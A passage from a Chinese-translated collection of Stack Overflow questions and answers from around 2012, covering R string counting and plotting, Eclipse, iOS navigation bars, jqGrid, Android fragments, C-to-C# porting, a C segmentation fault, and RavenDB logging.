          '0.6'
        ]; 
```

(*) = 使用哈希也是一种选择，假设 1) 原始顺序不重要，2) 所有单词都是唯一的。但是，除非快速查找是一个问题，否则使用数组没有缺点。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-15T00:20:11.463

```
my @list = ("word1", "word2", "word3", "word4");
my @confidences = (0.1, 0.9, 0.3, 0.6);

my @result = map { $list[$_] }
              sort { $confidences[$b] <=> $confidences[$a] }
                 grep { $confidences[$_] > 0.4 } (0..$#confidences); 
```

# r - 使用轴中断重新缩放分组散点图中的轴

> ID：12427376
> 
> 赞同：1
> 
> 时间：2012-09-14T15:17:21.913
> 
> 标签：r, plot, scatter-plot, plotrix

我在 R 中绘制的其中一些类型图表的数据，

[http://graphpad.com/faq/images/1352-1(1).gif](http://graphpad.com/faq/images/1352-1(1).gif)

有超出范围的异常值，我不能只排除它们。我尝试使用 plotrix 中的 axis.break() 函数，但该函数不会重新调整 y 轴。它只是在轴上放置一个中断标记。这样做的目的是能够在一个图框中显示两组的中位数、数据点和异常值。从本质上讲，与大多数数据点相距甚远的数据点占据了一大块空间，并且大多数数据点被压扁，没有显示出太大的差异。这是代码：

[https://gist.github.com/9bfb05dcecac3ecb7491](https://gist.github.com/9bfb05dcecac3ecb7491)

任何的意见都将会有帮助。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T19:51:41.787

不幸的是，您链接到的代码不是独立的，但您所拥有的代码可能`gap.plot()`无法按您预期的那样工作，因为您设置`ylim`为覆盖整个数据范围而不是仅绘制部分。考虑以下情节：![y 轴有间隙的散点图](../Images/fe0d3c3a6776426c45aa8a6ad5140ae3.png)

如您所见，y 轴每 50 pg/ml 都有刻度线，但在 175 和 425 之间存在差距。所以数据范围（最接近 50）是`c(0, 500)`，但 y 轴的范围是`c(0, 250)`- 就是这样200 和 250 的刻度线被视为 450 和 500 的刻度线。

该图是使用您的代码的以下修改版本生成的：

```
## made up data
GRO.Controls <- c(25, 40:50, 60, 150)
GRO.Breast <- c(70, 80:90, 110, 500)

##Scatter plot for both groups
library(plotrix)
gap.plot(jitter(rep(0,length(GRO.Controls)),amount = 0.2), GRO.Controls,
         gap = c(175,425), xtics = -2, # no xtics visible
         ytics = seq(0, 500, by = 50),
         xlim = c(-0.5, 1.5), ylim = c(0, 250), 
         xlab = "", ylab = "Concentrations (pg/ml)", main = "GRO(P=0.0010)")
gap.plot(jitter(rep(1,length(GRO.Breast)),amount = 0.2), GRO.Breast,
         gap = c(175, 425), col = "blue", add = TRUE)

##Adds x- variable (groups) labels
mtext("Controls", side = 1, at= 0.0)
mtext("Breast Cancer", side = 1, at= 1.0)

##Adds median lines for each group
segments(-0.25, median(GRO.Controls), 0.25, median(GRO.Controls), lwd = 2.0)
segments(0.75, median(GRO.Breast), 1.25, median(GRO.Breast), lwd = 2.0, 
    col = "blue") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:20:07.910

您可以通过点击帮助页面`gap.plot()`上的链接轻松找到它。`axis.break`那里有一个工作示例。

# eclipse - Eclipse，向导中没有 Web 项目

> ID：12427380
> 
> 赞同：0
> 
> 时间：2012-09-14T15:17:39.413
> 
> 标签：eclipse

尝试导入我在 intelliJ 中编写的一些代码，但在我的主工作站上遇到了问题，我的 Eclipse Juno 没有创建新 Web 项目的选项，但是在我的笔记本电脑上的 Eclipse Juno 中有选项，这很奇怪，因为它是相同版本的 Eclipse，对我应该如何开始一个 Web 项目有什么想法吗？

**编辑**谢谢安德烈，是的，我有错误的 Eclipse，但我的工作区中有很多东西，重新安装它是不可行的，让它在 Ubuntu 上工作也有点痛苦；我正在寻找 EE Web 工具的单一存储库，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-24T15:48:30.650

感谢 Andre 的回答，您可以在市场上找到 WTP 插件，不幸的是 Juno 没有默认的 Marketplace，因此您必须使用Eclipse 的安装新软件部分中的[Juno 软件存储库 URL来下载和安装 Marketplace](http://download.eclipse.org/releases/juno)

# regex - 如何计算给定字符在一列字符串的每一行中出现的次数？

> ID：12427385
> 
> 赞同：128
> 
> 时间：2012-09-14T15:17:55.220
> 
> 标签：regex, r, dataframe

我有一个 data.frame，其中某些变量包含一个文本字符串。我希望计算每个字符串中给定字符的出现次数。

例子：

```
q.data<-data.frame(number=1:3, string=c("greatgreat", "magic", "not")) 
```

我希望为 q.data 创建一个新列，其中包含字符串中“a”的出现次数（即 c(2,1,0)）。

我管理的唯一复杂的方法是：

```
string.counter<-function(strings, pattern){  
  counts<-NULL
  for(i in 1:length(strings)){
    counts[i]<-length(attr(gregexpr(pattern,strings[i])[[1]], "match.length")[attr(gregexpr(pattern,strings[i])[[1]], "match.length")>0])
  }
return(counts)
}

string.counter(strings=q.data$string, pattern="a")

 number     string number.of.a
1      1 greatgreat           2
2      2      magic           1
3      3        not           0 
```

* * *

## 回答 #1

> 赞同：168
> 
> 时间：2012-09-14T15:25:40.847

stringr 包提供的`str_count`功能似乎可以做你感兴趣的事情

```
# Load your example data
q.data<-data.frame(number=1:3, string=c("greatgreat", "magic", "not"), stringsAsFactors = F)
library(stringr)

# Count the number of 'a's in each element of string
q.data$number.of.a <- str_count(q.data$string, "a")
q.data
#  number     string number.of.a
#1      1 greatgreat           2
#2      2      magic           1
#3      3        not           0 
```

* * *

## 回答 #2

> 赞同：76
> 
> 时间：2012-09-14T15:44:03.463

如果您不想离开基础 R，这里有一个相当简洁和富有表现力的可能性：

```
x <- q.data$string
lengths(regmatches(x, gregexpr("a", x)))
# [1] 2 1 0 
```

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2012-09-14T19:23:57.053

```
nchar(as.character(q.data$string)) -nchar( gsub("a", "", q.data$string))
[1] 2 1 0 
```

请注意，在传递给 nchar 之前，我将因子变量强制转换为字符。正则表达式函数似乎在内部执行此操作。

这是基准测试结果（测试规模扩大到 3000 行）

```
 q.data<-q.data[rep(1:NROW(q.data), 1000),]
 str(q.data)
'data.frame':   3000 obs. of  3 variables:
 $ number     : int  1 2 3 1 2 3 1 2 3 1 ...
 $ string     : Factor w/ 3 levels "greatgreat","magic",..: 1 2 3 1 2 3 1 2 3 1 ...
 $ number.of.a: int  2 1 0 2 1 0 2 1 0 2 ...

 benchmark( Dason = { q.data$number.of.a <- str_count(as.character(q.data$string), "a") },
 Tim = {resT <- sapply(as.character(q.data$string), function(x, letter = "a"){
                            sum(unlist(strsplit(x, split = "")) == letter) }) }, 

 DWin = {resW <- nchar(as.character(q.data$string)) -nchar( gsub("a", "", q.data$string))},
 Josh = {x <- sapply(regmatches(q.data$string, gregexpr("g",q.data$string )), length)}, replications=100)
#-----------------------
   test replications elapsed  relative user.self sys.self user.child sys.child
1 Dason          100   4.173  9.959427     2.985    1.204          0         0
3  DWin          100   0.419  1.000000     0.417    0.003          0         0
4  Josh          100  18.635 44.474940    17.883    0.827          0         0
2   Tim          100   3.705  8.842482     3.646    0.072          0         0 
```

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2019-03-07T20:27:05.907

该`stringi`软件包提供了`stri_count`非常`stri_count_fixed`快的功能。

```
stringi::stri_count(q.data$string, fixed = "a")
# [1] 2 1 0 
```

**基准**

与[@42- 的答案中最快的方法以及](https://stackoverflow.com/a/12430764/8583393)[包](https://stackoverflow.com/a/12427545/8583393)中具有 30.000 个元素的向量的[等效函数相比。`stringr`](https://stackoverflow.com/a/12427545/8583393)

```
library(microbenchmark)

benchmark <- microbenchmark(
  stringi = stringi::stri_count(test.data$string, fixed = "a"),
  baseR = nchar(test.data$string) - nchar(gsub("a", "", test.data$string, fixed = TRUE)),
  stringr = str_count(test.data$string, "a")
)

autoplot(benchmark) 
```

**数据**

```
q.data <- data.frame(number=1:3, string=c("greatgreat", "magic", "not"), stringsAsFactors = FALSE)
test.data <- q.data[rep(1:NROW(q.data), 10000),] 
```

[![在此处输入图像描述](../Images/ca9371104cebefb512d55532319714c4.png)](https://i.stack.imgur.com/OgdCb.png)

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2016-07-06T16:17:36.783

另一个不错的选择，使用*charToRaw*：

```
sum(charToRaw("abc.d.aa") == charToRaw('.')) 
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2019-08-09T18:11:47.673

[https://stackoverflow.com/a/12430764/589165](https://stackoverflow.com/a/12430764/589165)的变体是

```
> nchar(gsub("[^a]", "", q.data$string))
[1] 2 1 0 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-09-14T15:23:59.490

我相信有人可以做得更好，但这有效：

```
sapply(as.character(q.data$string), function(x, letter = "a"){
  sum(unlist(strsplit(x, split = "")) == letter)
})
greatgreat      magic        not 
     2          1          0 
```

或在函数中：

```
countLetter <- function(charvec, letter){
  sapply(charvec, function(x, letter){
    sum(unlist(strsplit(x, split = "")) == letter)
  }, letter = letter)
}
countLetter(as.character(q.data$string),"a") 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-10-03T16:15:07.830

你可以只使用字符串除法

```
require(roperators)
my_strings <- c('apple', banana', 'pear', 'melon')
my_strings %s/% 'a' 
```

这将为您提供 1、3、1、0。您还可以将字符串除法与正则表达式和整个单词一起使用。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2019-03-19T04:26:48.677

下面的问题已移至此处，但似乎此页面并未直接回答 Farah El 的问题。 [如何在R中找到101中的数字1](https://stackoverflow.com/questions/55233227/how-to-find-number-1s-in-101-in-r)

所以，我会在这里写一个答案，以防万一。

```
library(magrittr)
n %>% # n is a number you'd like to inspect
  as.character() %>%
  str_count(pattern = "1") 
```

[https://stackoverflow.com/users/8931457/farah-el](https://stackoverflow.com/users/8931457/farah-el)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-01-20T06:37:18.073

另一种`base R`选择可能是：

```
lengths(lapply(q.data$string, grepRaw, pattern = "a", all = TRUE, fixed = TRUE))

[1] 2 1 0 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2017-12-26T09:54:58.773

恕我直言，最简单和最干净的方法是：

```
q.data$number.of.a <- lengths(gregexpr('a', q.data$string))

#  number     string number.of.a`
#1      1 greatgreat           2`
#2      2      magic           1`
#3      3        not           0` 
```

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2020-04-06T13:53:16.007

下一个表达式完成了这项工作，也适用于符号，而不仅仅是字母。

该表达式的工作原理如下：

> 1：它在数据帧 q.data 的列上使用 lapply 来迭代第 2 列的行（“lapply（q.data[,2]”），
> 
> 2：它适用于第 2 列的每一行一个函数“function(x){sum('a' == strsplit(as.character(x), '')[[1]])}”。该函数获取第 2 列 (x) 的每一行值，转换为字符（例如，如果它是一个因素），并在每个字符上拆分字符串（“strsplit(as.character(x), ' '）”）。因此，对于第 2 列的每一行，我们有一个包含字符串值的每个字符的向量。
> 
> 3：将向量的每个向量值与要计数的所需字符进行比较，在本例中为“a”（“'a' ==”）。此操作将返回 True 和 False 值“c(True,False,True,....)”的向量，当向量中的值与要计数的所需字符匹配时为 True。
> 
> 4：字符“a”出现在行中的总次数计算为向量“sum(....)”中所有“真”值的总和。
> 
> 5：然后应用“unlist”函数解包“lapply”函数的结果并将其分配给数据帧中的新列（“q.data$number.of.a<-unlist(.... ")

```
q.data$number.of.a<-unlist(lapply(q.data[,2],function(x){sum('a' == strsplit(as.character(x), '')[[1]])}))

>q.data

#  number     string     number.of.a
#1   greatgreat         2
#2      magic           1
#3      not             0 
```

* * *

## 回答 #13

> 赞同：-2
> 
> 时间：2015-05-08T06:00:16.827

```
s <- "aababacababaaathhhhhslsls jsjsjjsaa ghhaalll"
p <- "a"
s2 <- gsub(p,"",s)
numOcc <- nchar(s) - nchar(s2) 
```

**可能不是有效的，但可以解决我的目的。**

# iphone - Instagram 风格的导航栏隐藏

> ID：12427389
> 
> 赞同：3
> 
> 时间：2012-09-14T15:18:02.610
> 
> 标签：iphone, uinavigationbar

当用户向下滚动时，我需要隐藏导航栏。目前，我正在调用`setNavigationBarHidden: YES animated:YES`滚动，但这个解决方案并不理想，因为它会使主视图在调用动画时立即跳转。

Instagram 应用程序有一个更好的解决方案——导航栏锁定在主视图的顶部，并随着用户滚动而向上滚动。向下滚动几个像素，只有部分导航栏被隐藏。

关于如何实现这一点的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-02T15:57:08.613

查看[https://github.com/andreamazz/AMScrollingNavbar](https://github.com/andreamazz/AMScrollingNavbar)。它非常易于使用，只需`AMScrollingNavbar`在您的 viewController 中进行子类化

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-01T08:51:54.863

我已经完全找到了 Instagram 的做法 -[在这里查看我的答案](https://stackoverflow.com/questions/20273289/instagram-like-navigation-bar-ios-7) 没有平移手势识别器，隐藏设置栏，没有类似的东西，只是`scrollViewDidScroll`表格视图的委托方法内部的一些很酷的工程

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:53:57.653

我认为他们没有使用导航栏。我认为这是 UITableView 的自定义标题视图，或者至少我会这样做，因为您可以将任何 UIView 放在那里。

您可以使用 UITableView 委托来设置这些标题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T19:00:25.400

导航栏不提供此功能。最好的方法是使用自定义视图（您的自定义导航栏）作为主视图的子视图，然后自己制作动画，使用 [UIView animateWithDuration ....] 之类的功能和使用 CATransform3DTranslate 之类的翻译功能

# jqgrid - jqGrid：激活全选复选框时如何加载所有数据？

> ID：12427393
> 
> 赞同：4
> 
> 时间：2012-09-14T15:18:16.607
> 
> 标签：jqgrid

我有大约 1000-2000 行的大型 jqGrid，但默认情况下只加载了 100 个。我将多选设置为 true 并使用虚拟滚动，当单击全选复选框时，只有那些已经加载的行才会被选中。

我告诉我的用户，作为一种解决方法，他们需要向下滚动直到加载所有行。
这可行，但不是很用户友好。

我想要一种在单击“全选”时加载完整网格的方法。我可以使用一个名为“onSelectAll”的事件，但我不知道如何加载所有尚未加载的数据，并在数据加载完成后再次选择所有行。

有谁知道这个问题的简单解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-13T19:04:19.603

如果将选项添加到网格中`loadonce: true`，jqGrid 将向服务器请求所有数据。我认为这样一来，所有行都会立即加载。

# android - FragmentPagerAdapter 无法恢复 listfragment 属性

> ID：12427397
> 
> 赞同：0
> 
> 时间：2012-09-14T15:18:26.323
> 
> 标签：android, onresume, android-listfragment, fragmentpageradapter

我正在开发一个由 3 个片段组成的 Android 应用程序；其中一个将是 ListFragment，其内容将取决于其他 Fragment 上发生的情况。我使用 ViewPager 对象让用户在片段之间滑动；这是它的适配器类：

```
private class SwypePagerAdapter extends FragmentPagerAdapter{
    private Fragment[] tabFragments; 

    public SwypePagerAdapter(FragmentManager fm) {
        super(fm);
        tabFragments=new Fragment[NUMBER_OF_TABS];
        tabFragments[0]= Fragment.instantiate(StatCalculatorActivity.this, InsertFrag.class.getName());
        tabFragments[1]= Fragment.instantiate(StatCalculatorActivity.this, ResultFrag.class.getName());
        tabFragments[2]= Fragment.instantiate(StatCalculatorActivity.this, ValuesFrag.class.getName());
    }

    @Override
    public Fragment getItem(int position) {
        return tabFragments[position];
    }

    @Override
    public int getCount() {
        return NUMBER_OF_TABS;
    }

} 
```

一切都很好，直到 Activity 被销毁然后重新创建。在此之后 listFragment 看起来被锁定，它不会更新其数据，直到我销毁并重新创建该片段上的活动。这是怎么回事？我怎样才能恢复它？

**更新：** 我想我没有解释我真正的意思。看起来在我销毁并重新创建 Activity 之后，片段不再是以前的样子了；就好像旧的和新的重叠了一样，它们之间再也不能交流了……就像我失去了它们的引用一样，但它们仍然存在……

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:22:11.647

如果您想保持数据原样而不破坏，您可以在 PagerAdapter 中这样评论

```
@Override
    public void destroyItem(ViewGroup container, int position, Object object) {
        // TODO Auto-generated method stub
        //super.destroyItem(container, position, object);
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:15:20.820

除非将片段设置为保留，否则片段将随活动一起创建和销毁。为了维护您的数据，我会推荐以下两种方法之一：

*   使其可序列化
*   将其存储在您连接到活动的 onCreate 的保留缓存片段中

第二种方法可以通过制作一个片段并在片段的onCreate中添加以下内容并在活动被旋转销毁之前传入数据来实现

```
@Override
public void onCreate(Bundle savedInstanceState) {
    setRetainInstance(true);
    super.onCreate(savedInstanceState);
} 
```

# c# - C代码中的数组索引混淆

> ID：12427399
> 
> 赞同：0
> 
> 时间：2012-09-14T15:18:40.340
> 
> 标签：c#, c, porting

我正在将一些 C 代码移植到 C#。我被困在一个我不太了解作者以不熟悉的方式编写代码的意图的地方。

该代码是：

```
typedef struct{
  Int32 window[2][8];     
  Int32 windowF[2][8];
  short Index; 
}BLOCK_SWITCHING_CONTROL;

maxWindow = SrchMaxWithIndex( &blockSwitchingControl->window[0][8-1],
                                      &blockSwitchingControl->Index, 8);

*****************************************************************************
*
* function name: SrchMaxWithIndex
* description:  search for the biggest value in an array
* returns:      the max value
*
**********************************************************************************/
static Int32 SrchMaxWithIndex(const Int32 in[], Int16 *index, Int16 n)
{
  Int32 max;
  Int32 i, idx;

  /* Search maximum value in array and return index and value */
  max = 0;                                                       
  idx = 0;                                                       

  for (i = 0; i < n; i++) {

    if (in[i+1]  > max) {
      max = in[i+1];                                             
      idx = i;                                                   
    }
  }
  *index = idx;                                                  

  return(max);
} 
```

正如你所看到的，当`SrchMaxWithIndex`被调用时，不是一个数组而是一个数组`Int32`作为它的第一个参数被传递，这当然是错误的。但是因为我确定 C 代码没有任何问题，所以我确信我在这里遗漏了一些东西。我错过了什么？作者传递单个`Int32`而不是数组的意图是什么？

到目前为止，我已通过以下方式将上述内容移植到 C#：

```
static class BLOCK_SWITCHING_CONTROL{
  Int32[][] window = new int[2]{new int[8], new int[8]};     
  Int32[][] windowF = new int[2]{new int[8], new int[8]};
  short Index; 
};

 maxWindow = SrchMaxWithIndex( blockSwitchingControl.window[0]/*[8-1]*/,
                                      out blockSwitchingControl.Index);

*****************************************************************************
*
* function name: SrchMaxWithIndex
* description:  search for the biggest value in an array
* returns:      the max value
*
**********************************************************************************/
static Int32 SrchMaxWithIndex(Int32 _in[], out Int16 index)
{
  Int32 max;
  Int32 i, idx;

  /* Search maximum value in array and return index and value */
  max = 0;                                                       
  idx = 0;                                                       

  for (i = 0; i < _in.Length; i++) {

    if (in[i+1]  > max) {
      max = in[i+1];                                             
      idx = i;                                                   
    }
  }
  index = idx;                                                  

  return(max);
} 
```

但这只是为了消除 C# 中的错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:19:59.683

C 代码没有传递单个整数。它使用前缀运算符传递整数的*地址。*`&`

不过，似乎确实存在某种错字，因为 C 代码引用了其中似乎不存在的`windowN`成员 。`struct`

假设它的意思是`windowF`，这段代码：

```
maxWindow = SrchMaxWithIndex(&blockSwitchingControl->windowF[0][8-1],
                                  &blockSwitchingControl->Index, 8); 
```

告诉被调用函数将给定地址视为 8 个整数的数组。我认为这将溢出到`windowF[1][]`. 这是非常可怕的代码，但如果它像您所说的那样错误，它将无法编译。在 C 中，通常不能将整数传递给需要指针的函数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:44:05.083

好的，首先，我必须假设您在代码中有错误：

```
blockSwitchingControl->windowN 
```

不存在于 BLOCK_SWITCHING_CONTROL 结构中。所以我会回答这个假设你ment类似`windowF`

现在对于你的问题，作者确实传递了一个数组......有点。推测 blockSwitchingControl 是 BLOCK_SWITCHING_CONTROL 类型的结构。我们在这里做什么：

```
&blockSwitchingControl->windowF[0][8-1] 
```

正在传递 windowF 的 [0][7]'th 元素的地址。多维数组是线性（连续）内存，因此`Int32 windowF[2][8]`大小合适，可以将 16 个 Int32 存储在内存中的“行”中。就像是：

```
windowF[2][8] => [0][1][2][3][4][5][6][7][8][9][A][B][C][D][E][F][10] 
```

因此，如果我要传递 windowF 的 [0][7] 元素的地址，我实际上是传递了数组的**一部分：**

```
windowF[0][7]    [0][1][2][3][4][5][6][7][8][9][A][B][C][D][E][F][10]  //full array
          -----------------------------^ 
```

所以现在在 SrchMaxWithIndex() 里面我有 _in[] = 一个 Int32 的数组，它相当于 windowF 数组的一部分。所以你可以看到他们正在传递一个“数组的值”，即使它不是你所期望的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T15:21:06.327

正在传递数组元素的地址（注意`&`in `&blockSwitchingControl->windowN[0][8-1]`）。

So`in[i+1]`将等价于`blockSwitchingControl->windowN[0][8]`，大概是数组中的一个有效项。

# c - 写入和读取文件时出现 SIGSEV 错误

> ID：12427402
> 
> 赞同：0
> 
> 时间：2012-09-14T15:18:50.230
> 
> 标签：c, runtime-error

我正在编写代码来读取和写入文本文件。但是当我运行我的代码时，我得到了一个 SIGSEGV 运行时错误。我需要帮助找出代码有什么问题。

```
#include <stdio.h>
#include <stdlib.h>
int main(){
    /*Variable for writing to file */
    char *name[] = {"Raju", "Nayan", "Hanif"};
    char *id[] = {"100", "101", "102"};
    float cgpa[] = {3.50, 5.00, 4.00};
    /*Variable for reading from file*/
    char *getname, *getid;
    float getcgpa;
    int i;
    FILE *fp;
    fp = fopen("f:\\raju.nog", "w"); /*Create new file */
    for(i=0; i<5; i++){
        fprintf(fp, "%-10s%-10s%-1.2f\n", name[i], id[i], cgpa[i]); /*write to file*/
    }
    fclose(fp);
    /*read from file and print to screen*/
    fp = fopen("f:\\raju.nog", "r");
    while(fscanf(fp, "%s %s %f", &getname, &getid, &getcgpa) != EOF){
        printf("%-10s%-10s%-1.2f\n", getname, getid, getcgpa);
    }

    system("PAUSE");
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-14T15:21:30.253

数组：

```
char *name[] = {"Raju", "Nayan", "Hanif"};
char *id[] = {"100", "101", "102"};
float cgpa[] = {3.50, 5.00, 4.00}; 
```

声明 3 个元素，但

```
for(i=0; i<5; i++){
    fprintf(fp, "%-10s%-10s%-1.2f\n", name[i], id[i], cgpa[i]); /*write to file*/
} 
```

正在尝试迭代 5 次以上，从而超出了数组的范围。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-14T16:22:17.453

您的代码有几个问题：

*   您正在将每个变量的 5 个元素写入文件，但每个变量只有三个元素 - 导致[缓冲区溢出](http://en.wikipedia.org/wiki/Buffer_overflow)
*   getname, getid 变量只是指针，没有存储空间

要找到这些错误，您应该能够使用调试器单步执行。

这是有效的代码：

```
#include <stdio.h>
#include <stdlib.h>
int main(){
    /*Variable for writing to file */
    char *name[] = {"Raju", "Nayan", "Hanif"};
    char *id[] = {"100", "101", "102"};
    float cgpa[] = {3.50, 5.00, 4.00};
    /*Variable for reading from file*/

    // need storage space
    char getname[40], getid[40];
    float getcgpa;
    int i;
    FILE *fp;
    fp = fopen("raju.nog", "w"); /*Create new file */

    // Only 3 elements
    for(i=0; i<3; i++){
        fprintf(fp, "%-10s%-10s%-1.2f\n", name[i], id[i], cgpa[i]); /*write to file*/
    }
    fclose(fp);
    /*read from file and print to screen*/
    fp = fopen("raju.nog", "r");
    while(fscanf(fp, "%s %s %f", &getname, &getid, &getcgpa) != EOF){
        printf("%-10s%-10s%-1.2f\n", getname, getid, getcgpa);
    }
    return(0);
} 
```

如果您可以访问 gdb，您可能会发现第一个问题，然后是第二个问题。这是我的 GDB 会话的日志，指出导致代码中第一个错误的行：

```
(gdb) run
Starting program: /home/jrn/SO/a.out 

Program received signal SIGSEGV, Segmentation fault.
0x005cc35e in vfprintf () from /lib/libc.so.6
(gdb) bt
#0  0x005cc35e in vfprintf () from /lib/libc.so.6
#1  0x005d33cf in fprintf () from /lib/libc.so.6
#2  0x08048565 in main () at sowrong.c:15
(gdb) list
1   #include <stdio.h>
2   #include <stdlib.h>
3   int main(){
4       /*Variable for writing to file */
5       char *name[] = {"Raju", "Nayan", "Hanif"};
6       char *id[] = {"100", "101", "102"};
7       float cgpa[] = {3.50, 5.00, 4.00};
8       /*Variable for reading from file*/
9       char *getname, *getid;
10      float getcgpa;
(gdb) list
11      int i;
12      FILE *fp;
13      fp = fopen("f:\\raju.nog", "w"); /*Create new file */
14      for(i=0; i<5; i++){
15          fprintf(fp, "%-10s%-10s%-1.2f\n", name[i], id[i], cgpa[i]); /*write to file*/
16      }
17      fclose(fp);
18      /*read from file and print to screen*/
19      fp = fopen("f:\\raju.nog", "r");
20      while(fscanf(fp, "%s %s %f", &getname, &getid, &getcgpa) != EOF){
(gdb) list
21          printf("%-10s%-10s%-1.2f\n", getname, getid, getcgpa);
22      }
23  } 
```

注意这一行：`#2 0x08048565 in main () at sowrong.c:15`
这告诉你第 15 行发生了段错误。之后你可以列出文件以查看该行。

所以现在在修复第 15 行之后，你再次编译你的程序并通过 GDB 运行它来找到第二个问题。这是我的 GDB 会话的日志：

```
(gdb) run
Starting program: /home/jrn/SO/a.out 

Program received signal SIGSEGV, Segmentation fault.
0x005cc35e in vfprintf () from /lib/libc.so.6
(gdb) bt
#0  0x005cc35e in vfprintf () from /lib/libc.so.6
#1  0x005d3410 in printf () from /lib/libc.so.6
#2  0x080485be in main () at sowrong.c:21
(gdb) list
1   #include <stdio.h>
2   #include <stdlib.h>
3   int main(){
4       /*Variable for writing to file */
5       char *name[] = {"Raju", "Nayan", "Hanif"};
6       char *id[] = {"100", "101", "102"};
7       float cgpa[] = {3.50, 5.00, 4.00};
8       /*Variable for reading from file*/
9       char *getname, *getid;
10      float getcgpa;
(gdb) list
11      int i;
12      FILE *fp;
13      fp = fopen("f:\\raju.nog", "w"); /*Create new file */
14      for(i=0; i<3; i++){
15          fprintf(fp, "%-10s%-10s%-1.2f\n", name[i], id[i], cgpa[i]); /*write to file*/
16      }
17      fclose(fp);
18      /*read from file and print to screen*/
19      fp = fopen("f:\\raju.nog", "r");
20      while(fscanf(fp, "%s %s %f", &getname, &getid, &getcgpa) != EOF){
(gdb) list
21          printf("%-10s%-10s%-1.2f\n", getname, getid, getcgpa);
22      }
23  } 
```

再次注意这一行：`#2 0x080485be in main () at sowrong.c:21`
第二个 SEGFAULT，因为您的变量只是没有存储空间的指针。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-14T15:21:10.380

你没有 malloc 内存

```
 char *getname, *getid; 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-14T15:21:14.497

`char *getname, *getid;`只分配指针，而不是内存来存储字符串。你需要类似的东西：

```
char getname[11];
char getid[11]; 
```

我已经从您的陈述中猜到了大小`printf`，但您可能想要比这些更大的数组。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-09-14T15:22:49.623

您的 for 循环计数器从 0 变为 4，但您为数组`name`，`id`并且`cgpa`只有 3 个元素：因此您将超出数组边界。

# logging - RavenDB、StructureMap 和日志记录

> ID：12427406
> 
> 赞同：1
> 
> 时间：2012-09-14T15:18:59.060
> 
> 标签：logging, structuremap, ravendb

目标是创建日志类并使用 RavenDB 进行存储。我最初想使用 NLog，它不附带 RavenDb 目标，但可以轻松添加它。我也这样做了，但我的目标没有按预期行事，我正在旋转我的轮子试图弄清楚它并最终决定创建我自己的服务。

我还打算使用 StructureMap 将此日志服务注入客户端。这是我最初的 SM 配置：

```
x.For<ILogger>().Use<Logger>()
     .Ctor<IDocumentStore>("store").Is(c => c.GetInstance<IDocumentStore>())
     .Ctor<ILogEntry>("logEntry").Is(c => c.GetInstance<ILogEntry>())
     .Ctor<ILogLevelConfig>("logLevelConfig")
     .Is(c => c.GetInstance<ILogLevelConfig>());

x.For<IDocumentStore>()
     .Singleton()
     .Use(() => new DocumentStore { Url="http://localhost:8080/" })
     .OnCreation<IDocumentStore>(c => c.Initialize());

// ILogEntry is implemented by a class, which will eventually be saved in Raven
// ILogLevelConfig is used for configuration purposes 
```

以下是简化版`Logger`：

```
public class Logger : ILogger
{
    private readonly ILogEntry _logEntry;
    private readonly IDocumentStore _store;
    private readonly ILogLevelConfig _logLevelConfig;

    public Logger(IDocumentStore store, ILogEntry logEntry, ILogLevelConfig logLevelConfig)
    {
        _logEntry = logEntry;
        _logEntry.TimeStamp = new DateTimeOffset(DateTime.UtcNow);
        _logLevelConfig = logLevelConfig;
        _store = store;
    }

    public void Info(string message, string userId = null)
    {
        if (!_logLevelConfig.IsAllEnabled && !_logLevelConfig.IsInfoEnabled) return;
        _logEntry.LogLevel = LogLevel.Info;
        _logEntry.Message = message;
        _logEntry.UserIdentity = userId;
        Write();
    }

    private void Write()
    {
        using(var session = _store.OpenSession())
        {
            session.Store(_logEntry);
            session.SaveChanges();
        }
    } 
```

现在，让我们模拟注入`Logger`一些客户端：

```
var logger = ObjectFactory.GetInstance<ILogger>();
logger.Info("info 1");
logger.Info("info 2"); 
```

问题：

1.  实现的方式`Write()`记录器将两次访问数据库[对于'info 1'，然后对于'info 2'。如果我决定非常详细地记录我的日志，这将是一种非常健谈的方法。我该怎么做才能将所有内容收集`logger.Info(...)`到一个中，然后`session.SaveChanges()`调用一次并一次性保存所有条目？
2.  当我像这样替换`IDocumentStore`实现时： `x.For<IDocumentStore>().Singleton().Use(() => new EmbeddableDocumentStore { RunInMemory = true, UseEmbeddedHttpServer = true }).OnCreation<IDocumentStore>(c => c.Initialize());`只有第二次调用`logger.Info(..)`才会实际保存在数据库中。为什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-21T14:29:24.310

您的对象模型的一个问题是`ILogEntry`实例与实例相关联，`ILogger`而不是按应有的方式为每个日志请求创建。如果你看一下 NLog 或 log4net 是如何实现的，你会发现它们为每个日志请求创建了一个相应的日志条目实例。

